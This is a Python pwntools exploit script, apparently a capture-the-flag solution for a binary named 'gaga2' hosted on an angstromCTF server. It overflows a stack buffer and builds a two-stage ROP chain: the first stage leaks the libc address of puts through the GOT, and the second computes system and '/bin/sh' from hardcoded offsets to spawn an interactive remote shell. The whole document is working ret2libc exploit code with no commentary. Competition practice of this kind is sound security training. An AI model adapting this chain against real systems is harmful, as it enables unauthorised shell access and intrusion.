from pwn import *
context.binary = "./gaga2"
chall = ELF("./gaga2")
ropper = ROP(chall)

s = remote('challs.actf.co', 31302)
#s = process(executable = "./gaga2", argv = [])
payload = b"a"*0x40 + b"aaaaaaaa" 
pop_rdi = p64(ropper.find_gadget(["pop rdi", "ret"]).address)
ret = p64(ropper.find_gadget(["ret"]).address)

puts_plt = p64(chall.plt["puts"])
puts_got = chall.got["puts"]
main = p64(0x00000000004011D6)
payload += (pop_rdi + p64(puts_got) + puts_plt)
payload += (main)

system_offset = 0x0000000000052290
binsh_offset = 0x1b45bd
puts_offset = 0x0000000000084420

s.sendline(payload)
s.recvuntil(b"Your input: ")
addr = int.from_bytes(s.recv(6), "little")
system = p64(system_offset + addr - puts_offset)
binsh = p64(binsh_offset + addr - puts_offset)

print(hex(addr))
payload = b"a"*0x40 + b"aaaaaaaa" + pop_rdi + binsh + ret +  system
s.sendlineafter(b"Your input: ", payload)
s.interactive()